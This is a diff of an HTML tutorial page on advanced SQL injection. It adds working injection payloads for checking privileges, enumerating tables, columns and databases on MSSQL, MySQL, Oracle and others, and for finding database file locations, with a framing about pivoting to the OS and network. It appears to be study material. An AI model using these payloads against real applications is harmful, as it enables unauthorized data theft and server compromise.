@@ -1,6 +1,78 @@
   <a href=../index.html>Back to home</a>
 <hr/>
-<h1>Blind SQL Injection Vulnerability in MySQL and MSSQL</h1>
-<p>An attacker can identify blind SQL injection vulnerabilities by simply testing the <b>URLS</b> of a target website.</p>
-<p>For example: <i>shop.com/items.php?id=101</i> has corresponding SQL query <i>SELECT * FROM ITEMS WHERE ID = 101</i> </p>
-<p>
+<h1>Advanced SQL Injection</h1>
+<p>The attacker does not stop at compromising an application's data. The attacker will advance the SQL injection attack to compromise the underlying OS and network. 
+Using the compromised application, the attacker can issue commands to the underlying OS to take over the target machine and use it as a staging post to attack the rest of the network.</p>
+
+<h1>Database, Table and Column Enumeration</h1>
+<h2>Identify User Level Privilege</h2>
+<p>There are several SQL built-in scalar functions that will work in most SQL implementations:</p>
+<p><ol>
+  <ul>user or current_user, session_user, system_user</ul>
+  <ul>' and 1 in (select user) --</ul>
+  <ul>'; if user = 'dbo' waitfor delay '0:0:5' --</ul>
+  <ul>union select if ( user() like 'root@%', benchmark(50000, sha1('test')), 'false');</ul>
+</ol></p>
+
+<h2>DB Admins</h2>
+<p>Default admin accounts include sa, system, sys, dba, admin, root etc. The dbo is a user that has implied permissions to perform all activities in the database. Any object created by any member of the 
+sysadmin fixed server role belongs to dbo automatically!</p>
+
+<h2>Discover DB Structure</h2>
+<p>Determine table and column names<br/>
+<i>' group by columnnames having 1=1 --</i></p>
+
+<p>Discover column name types<br/>
+<i>' union select sum(columnname) from tablename --</i></p>
+
+<p>Enumerate user defined tables<br/>
+<i>' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --</i></p>
+
+<h2>Column Enumeration in DB</h2>
+<p><ol>
+  <ul>MSSQL -> SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename'); sp_columns tablename</ul>
+  <ul>MySQL -> show columns from tablename</ul>
+  <ul>Oracle -> SELECT * FROM all_tab_columns WHERE table_name = 'tablename'</ul>
+  <ul>DB2 -> SELECT * FROM syscat.columns WHERE tabname = 'tablename'</ul>
+  <ul>PostgreSQL -> SELECT attnum, attname from pg_class, pg_attribute WHERE relname = 'tablename' AND pg_class.oid=attrelid AND attnum > 0</ul>
+</ol></p>
+
+<h1>Advanced Enumeration</h1>
+<p>The following database objects are used for enumeration:</p>
+<h2>Oracle</h2>
+<p><ol>
+  <ul>SYS.USER_OBJECTS</ul>
+  <ul>SYS.TABLES, SYS.USER_TABLES</ul>
+  <ul>SYS.USER_VIEWS</ul>
+  <ul>SYS.ALL_TABLES</ul>
+  <ul>SYS.COLUMNS</ul>
+  <ul>SYS.USER_OBJECTS</ul>
+</ol></p>
+<h2>MS Access</h2>
+<p><ol>
+  <ul>MsysACEs</ul>
+  <ul>MsysObjects</ul>
+  <ul>MsysQueries</ul>
+  <ul>MsysRelationships</ul>
+</ol></p>
+<h2>MySQL</h2>
+<p><ol>
+  <ul>mysql.user</ul>
+  <ul>mysql.db</ul>
+  <ul>mysql.tables_priv</ul>
+</ol></p>
+<h2>MSSQL Server</h2>
+<p><ol>
+  <ul>sysobjects</ul>
+  <ul>syscolumns</ul>
+  <ul>systypes</ul>
+  <ul>sysdatabases</ul>
+</ol></p>
+
+<h2>Tables and columns enumeration in one query</h2>
+<p><i>' union select 0, sysobjects.name + ': ' + syscolumns.name + ': ' + systypes.name, 1, 1, '1', 1, 1, 1, 1, 1 from sysobjects, 
+syscolumns, systypes where sysobjects.xtype = 'U' AND sysobjects.id = syscolumns.id AND syscolumns.xtype = systypes.xtype --</i></p>
+
+<h2>Database Enumeration</h2>
+<p><i>' and 1 in (select min(name) from master.dbo.sysdatabases where name >'.' ) --</i> -> different databases in server</p>
+<p><i>' and 1 in (select min(filename) from master.dbo.sysdatabases where filename >'.' ) -- </i> -> file location of databases</p>
